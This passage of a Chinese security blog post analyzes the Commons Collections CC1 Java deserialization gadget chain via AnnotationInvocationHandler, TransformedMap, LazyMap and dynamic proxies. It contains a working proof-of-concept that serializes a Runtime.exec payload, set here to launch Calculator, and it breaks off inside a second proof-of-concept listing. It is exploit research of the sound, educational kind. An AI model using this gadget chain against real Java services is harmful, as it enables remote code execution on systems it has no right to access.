+<h2 id="0x04-通过反序列化执行触发漏洞"><a href="#0x04-通过反序列化执行触发漏洞" class="headerlink" title="0x04 通过反序列化执行触发漏洞"></a>0x04 通过反序列化执行触发漏洞</h2><p>上面的 Demo 需要我们手工执行改变 map 中的 key 的值，也就是手动执行 <code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code>才可以触发命令执行，但在实际的应用中，不可能让我们手动执行，所以需要找到一个实现了<code>Serializable</code>的类，它在反序列化的readObject逻辑里有类似的写入操作。</p>
+<p>这里配合我们执行代码的类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，该类是java运行库中的一个类，实现了<code>Serializable</code>接口，并且包含一个<code>Map</code>对象属性，其<code>readObject</code>方法有自动修改自身Map属性的操作。</p>
+<blockquote>
+<p>  至于为什么最终会找到的这个类，我就不清楚了，应该需要对 java 的各种类都有个详细的了解。基于此我有个idea，来帮助快速寻找可能存在的利用链</p>
+</blockquote>
+<p>我们看下<code>jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</code>这个类(jdk1.7.0_80)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214036.png" srcset="/img/loading.gif" lazyload alt="image-20210610075434821"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214042.png" srcset="/img/loading.gif" lazyload alt="image-20210610082647689"></p>
+<p>在<code>readObject</code>中遍历了 map ,然后在<code>var5.setValue()</code>会改变map中的 value，并且<strong>var2</strong> 和<strong>var4</strong>的值是可控的，都可以在构造方法中设置<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214048.png" srcset="/img/loading.gif" lazyload alt="image-20210610082847106"></p>
+<p>所以我们可以创建一个<code>AnnotationInvocationHandler</code>对象，将之前构造的POC放入<code>AnnotationInvocationHandler</code>对象中，当目标存在反序列化漏洞时，就会自动触发<code>setValue</code>操作改变map中的value的值，从而触发上面分析的过程，执行命令。</p>
+<p>因为AnnotationInvocationHandler是一个内部类，不能通过new来实例化，所以需要用到反射来获取对象</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Class cls = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-comment">// 因为AnnotationInvocationHandler只有个私有的有参构造，所以需要getDeclaredConstructor获取</span><br>Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);<br><span class="hljs-comment">//设置所有的成员都可以访问</span><br>constructor.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">// 获取对象，第一个参数是一个Annotation类; 第二个是参数就是前面构造的Map。</span><br>Object obj = constructor.newInstance(Retention.class,outerMap);<br></code></pre></div></td></tr></table></figure>
+
+<p>然后将代码拼接，并模拟一下序列化与反序列化的过程，看看能不能自动触发命令执行<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214056.png" srcset="/img/loading.gif" lazyload alt="image-20210610083441461"></p>
+<p>出错，这是因为<code>Runtime</code>没有继承<code>Serializer</code>接口，是无法进行序列化的，所以需要反射获取<code>Runtime</code>对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> con.yhy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/6/10 08:06</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>        &#125;;<br><br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br><br><span class="hljs-comment">//        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><br>        Class cls = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-comment">// 因为AnnotationInvocationHandler只有个私有的有参构造，所以需要getDeclaredConstructor获取</span><br>        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);<br>        <span class="hljs-comment">//设置所有的成员都可以访问</span><br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 获取对象，第一个参数是一个Annotation类; 第二个是参数就是前面构造的Map。</span><br>        Object obj = constructor.newInstance(Retention.class,outerMap);<br><br>        <span class="hljs-comment">// 将上述过程序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./exp.bin&quot;</span>));<br>        outputStream.writeObject(obj);<br>        outputStream.close();<br><br>        <span class="hljs-comment">// 模拟目标后端程序接受到的序列化后的数据</span><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./exp.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br>        fin.readObject();<br><br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>我们将<code>Runtime.getRuntime()</code>换成<code>Runtime.class</code>，前者是一个<code>java.lang.Runtime</code>对象，后者是一个<code>java.lang.Class </code>对象。Class类有实现Serializable接口，所以可以被序列化,之后利用反射的知识和InvokerTransformer实现的<code>transform</code>方法的特性获取<code>getRuntime</code>方法并执行。</p>
+<p>改造完成后执行，我们发现虽然没有了错误，但还是没有执行命令。按理说我们的逻辑是通的：</p>
+<ol>
+<li> <strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>的<strong>readObject</strong>会调用我们传入map的setValue方法，改变 map 中的value的值;</li>
+<li> 当 map 中的 value 的值发生改变时会调用对应的<strong>transform</strong>方法,这里是ChainedTransformer的<strong>transform</strong>方法;</li>
+<li> ChainedTransformer的<strong>transform</strong>方法，接受一个Transformer类型的数组，然后遍历执行数组中元素的<strong>transform</strong>方法，并且将上个元素的返回结果作为下个元素执行<strong>transform</strong>方法的参数;</li>
+<li> 然后我们利用了ConstantTransformer和InvokerTransformer精心构造了一个**Transformer[]**数组来执行命令</li>
+</ol>
+<p>在加入<code>AnnotationInvocationHandler</code>之前都是可以正常执行命令的，所以问题可能出在了<strong>AnnotationInvocationHandler</strong>的<strong>readObject</strong>方法，来调试一下看看，直接在<strong>AnnotationInvocationHandler#readObject</strong>这里下断点<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214106.png" srcset="/img/loading.gif" lazyload alt="image-20210610171645781"></p>
+<p>调试中发现，它在355行执行完后，直接到最后行末了，<code>var5.setValue</code>根本就没有执行的机会，在右下角的参数值里面可以看到 <code>this.memberValues</code>里根本就没有值，所以不会向下执行。</p>
+<p>看了一下P牛的代码，发现在HashMap实例化后，添加了一个数据<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214115.png" srcset="/img/loading.gif" lazyload alt="image-20210610173610117">然后就可以执行了，再次debug，可以看到在执行完第一句<code>var1.defaultReadObject();</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214122.png" srcset="/img/loading.gif" lazyload alt="image-20210610173926189"></p>
+<p><code>this.memberValues</code>就不为零了，然后经过测试发现<code>innerMap.put(&quot;value&quot;, &quot;yhy&quot;);</code> 只有添加的key的值为<strong>value</strong>才可以触发，只有当key为<code>value</code>时<code>var7 != null</code>才会成立，这点P牛给出的答案是：</p>
+<blockquote>
+<p>那么如何让这个var7不为null呢?这一块我就不详细分析了，还会涉及到Java注释(ps:这里应该是注解)相关的技术。直接给出两个条件:</p>
+<ol>
+<li><p> sun.reflect.annotation.AnnotationInvocationHandler构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p>
+</li>
+<li><p> 被TransformedMap.decorate修饰的Map中必须有一个键名为X的元素</p>
+</li>
+</ol>
+<p>所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value;所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素:</p>
+</blockquote>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214135.png" srcset="/img/loading.gif" lazyload alt="image-20210610174833432"></p>
+<p>P牛说的第一点应该是这里，<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>的构造方法里确实是这样要求的，传入的第一个参数只能为注解类型，<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214140.png" srcset="/img/loading.gif" lazyload alt="image-20210610185739244"></p>
+<p>为什么要有一个方法呢？<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214144.png" srcset="/img/loading.gif" lazyload alt="image-20210610210327715"></p>
+<p>这里的 var7 是经过传入的注解类实例化执行<code>memberTypes()</code>经过下面的转化过程，返回map，得到var3，转化过程可以debug看看，当注解类存在方法时会返回最下方框的一个map集合，这时<code>(Class)var3.get(var6);</code>才会存在值，即<code>var7 != null</code>。(存在方法的注解类有两个<code>Retention</code>和<code>Target</code>，这两个传入哪个都可以)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214150.png" srcset="/img/loading.gif" lazyload alt="image-20210610211055963"></p>
+<p>下面找了一个不存在方法的注解类<code>Documented</code>进行对比，会发现最终返回时根本没有值。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214154.png" srcset="/img/loading.gif" lazyload alt="image-20210610212059476"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214200.png" srcset="/img/loading.gif" lazyload alt="image-20210610211721560"></p>
+<p>第二点会好理解点：之前说过，修改 map 中的key或者value时会自动触发我们自定义的<code>transform</code>方法，因为<code>Retention</code>注解中的方法名为<strong>value</strong>，在上面转换中，将此方法名放入了转换后 map 的 key中，所以想要改动map中的value，必须使用相同的key值即<strong>value</strong>。</p>
+<blockquote>
+<p>  这点配合参考中的：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7031#toc-7%E9%A3%9F%E7%94%A8%E6%9B%B4%E4%BD%B3%EF%BC%8C%E4%BD%9C%E8%80%85%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%BF%B0%E4%BA%86%E6%B3%A8%E8%A7%A3">https://xz.aliyun.com/t/7031#toc-7食用更佳，作者详细讲述了注解</a></p>
+</blockquote>
+<p>至此，经过P牛简化后的<strong>利用链</strong>，已经大致清晰，并且可以用以实战，但是上述生成的序列化数据只能在<strong>Java 8u71</strong>之前使用，在8u71以后大概是2015年12月的时候，Java 官方修改了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的<code>readObject</code>函数:<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p>
+<p>修改jdk版本，重新运行，可以看到并没有执行命令<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610214205.png" srcset="/img/loading.gif" lazyload alt="image-20210610213815088"></p>
+<p>改动后的<strong>readObject</strong>函数不再有针对我们构造的map的赋值语句，所以触发不了漏洞。而是改成了新建一个LinkedHashMap，把值转进这个LinkedHashMap里面。</p>
+<p>所以，后续对Map的操作都是基于这个新的 LinkedHashMap 对象，而原来我们精心构造的Map不再执 行set或put操作，也就不会触发RCE了。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110500.png" srcset="/img/loading.gif" lazyload alt="image-20210610215539317"></p>
+<h2 id="0x05-ysoserial项目中的CC1链"><a href="#0x05-ysoserial项目中的CC1链" class="headerlink" title="0x05 ysoserial项目中的CC1链"></a>0x05 ysoserial项目中的CC1链</h2><p>可以看到利用链中并没有之前分析的一个关键点<strong>TransformedMap</strong>，而是变成了<strong>LazyMap</strong>，这就导致了之后的利用链完全不同</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Gadget chain:</span><br><span class="hljs-comment">      ObjectInputStream.readObject()</span><br><span class="hljs-comment">         AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">            Map(Proxy).entrySet()</span><br><span class="hljs-comment">               AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">                  LazyMap.get()</span><br><span class="hljs-comment">                     ChainedTransformer.transform()</span><br><span class="hljs-comment">                        ConstantTransformer.transform()</span><br><span class="hljs-comment">                        InvokerTransformer.transform()</span><br><span class="hljs-comment">                           Method.invoke()</span><br><span class="hljs-comment">                              Class.getMethod()</span><br><span class="hljs-comment">                        InvokerTransformer.transform()</span><br><span class="hljs-comment">                           Method.invoke()</span><br><span class="hljs-comment">                              Runtime.getRuntime()</span><br><span class="hljs-comment">                        InvokerTransformer.transform()</span><br><span class="hljs-comment">                           Method.invoke()</span><br><span class="hljs-comment">                              Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Requires:</span><br><span class="hljs-comment">      commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110455.png" srcset="/img/loading.gif" lazyload alt="image-20210611074945777"></p>
+<h3 id="5-1-ysoserial中的LazyMap"><a href="#5-1-ysoserial中的LazyMap" class="headerlink" title="5.1 ysoserial中的LazyMap"></a>5.1 ysoserial中的LazyMap</h3><p>LazyMap和TransformedMap类似，都来自于CommonCollections库，并继承自AbstractMapDecorator。</p>
+<p><strong>TransformedMap</strong>是只要调用decorate()函数，传入key和value的变换函数Transformer，然后Map中的任意项的Key或者Value被修改，相应的Transformer(keyTransformer或者valueTransformer)的<strong>transform</strong>方法就会被调用。</p>
+<p><strong>LazyMap</strong>是只要执行 get 方法就会调用<strong>transform</strong>，这个利用链利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用精心构造对象的 LazyMap 的get方法。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110452.png" srcset="/img/loading.gif" lazyload alt="image-20210611080807562"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110448.png" srcset="/img/loading.gif" lazyload alt="image-20210611101901231"></p>
+<p>但是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>方法中并没有直接调用到Map(this.memberValues)的get方法。</p>
+<p>所以ysoserial找到了另一条路，因为AnnotationInvocationHandler类 同时也实现了<code>InvocationHandler</code>接口（动态代理），在<code>invoke</code>方法有调用到get<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110445.png" srcset="/img/loading.gif" lazyload alt="image-20210611081300634"></p>
+<p>从这点就可以看出<strong>LazyMap</strong>这条链比<strong>TransformedMap</strong>较为复杂，在<strong>TransformedMap</strong>那条利用链中，我们只需要将map对象利用反射放入<code>AnnotationInvocationHandler</code>中，然后序列化数据即可。</p>
+<p>而<strong>LazyMap</strong>若想要调用到<code>invoke</code>还需要用到Java中的动态代理，来一起简单学习吧。</p>
+<h3 id="5-2-Java动态代理"><a href="#5-2-Java动态代理" class="headerlink" title="5.2 Java动态代理"></a>5.2 Java动态代理</h3><p>先来理解下什么是动态代理</p>
+<blockquote>
+<p>  <strong>在不修改类的源码的情况下,通过代理的方式为类的方法提供更多的功能。</strong></p>
+<p>  举个例子来说（这个例子在开发中很常见）：我的开发们实现了业务部分的所有代码，忽然我期望在这些业务代码中添加日志记录功能的时候，一个一个类去添加代码就会非常麻烦，这个时候我们就能通过动态代理的方式对期待添加日志的类进行代理。</p>
+</blockquote>
+<p>在java的 java.lang.reflect 包下提供了一个<code>Proxy</code>类和一个<code>InvocationHandler</code>接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。 </p>
+<p>P牛写了一个Demo，我们来看下</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.Ser;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-comment">// ExampleInvocationHandler类实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串Hacked Object </span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExampleInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> Map map;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExampleInvocationHandler</span><span class="hljs-params">(Map map)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().compareTo(<span class="hljs-string">&quot;get&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook method: &quot;</span> + method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hacked Object&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.Ser;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        InvocationHandler handler = <span class="hljs-keyword">new</span> ExampleInvocationHandler(<span class="hljs-keyword">new</span> HashMap());<br>        <span class="hljs-comment">// Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可;</span><br>        <span class="hljs-comment">//第二个参数是我们需要 代理的对象集合;</span><br>        <span class="hljs-comment">//第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。</span><br>        Map proxyMap = (Map) Proxy.newProxyInstance(<br>                Map.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;,<br>                handler<br>        );<br>        proxyMap.put(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<br>        String result = (String) proxyMap.get(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>运行App，我们可以发现，虽然向Map放入的hello值为world，但获取到的结果却是：<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110439.png" srcset="/img/loading.gif" lazyload alt="image-20210611083456820"></p>
+<p>当一个类实现了<code>InvocationHandler</code>接口，并实现<code>invoke</code>方法，我们就可以通过动态代理的方式去劫持该类的内部函数调用，当执行该类的任意方法时都会调用<code>invoke</code>方法。</p>
+<p>我们再来看看<code>AnnotationInvocationHandler</code>类，它实现了<code>InvocationHandler</code>,并且实现了<code>invoke</code>方法<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110435.png" srcset="/img/loading.gif" lazyload alt="image-20210611084448243"></p>
+<p>所以ysoserial通过动态代理劫持了AnnotationInvocationHandler的调用</p>
+<h3 id="5-3-通过LazyMap构造利用链"><a href="#5-3-通过LazyMap构造利用链" class="headerlink" title="5.3 通过LazyMap构造利用链"></a>5.3 通过LazyMap构造利用链</h3><p>将之前 Demo 中的 TransformedMap 换成 LazyMap</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Map outerMap = LazyMap.decorate(innerMap,transformerChain);<br></code></pre></div></td></tr></table></figure>
+
+<p>通过动态代理劫持AnnotationInvocationHandler</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 通过反射机制 实例化 AnnotationInvocationHandler</span><br>Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br><span class="hljs-comment">//取消构造函数修饰符限制</span><br>ctor.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//获取AnnotationInvocationHandler类实例</span><br>Object instance = ctor.newInstance(Target.class, outerMap);<br><br><span class="hljs-comment">// 动态代理劫持 （Proxy 实现了Serializable接口 是可以序列化的）</span><br>InvocationHandler handler = (InvocationHandler) instance;<br>Map proxyMap = (Map) Proxy.newProxyInstance(<br>	Map.class.getClassLoader(),<br>	<span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;,<br>	handler<br>);<br></code></pre></div></td></tr></table></figure>
+
+<p>因为我们反序列化的入口点是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject </code>,所以我们需要使用<code>AnnotationInvocationHandler</code>对这个<code>proxyMap</code>进行包裹:</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Object proxy =  ctor.newInstance(Target.class, proxyMap);<br></code></pre></div></td></tr></table></figure>
+
+<p>完整POC</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 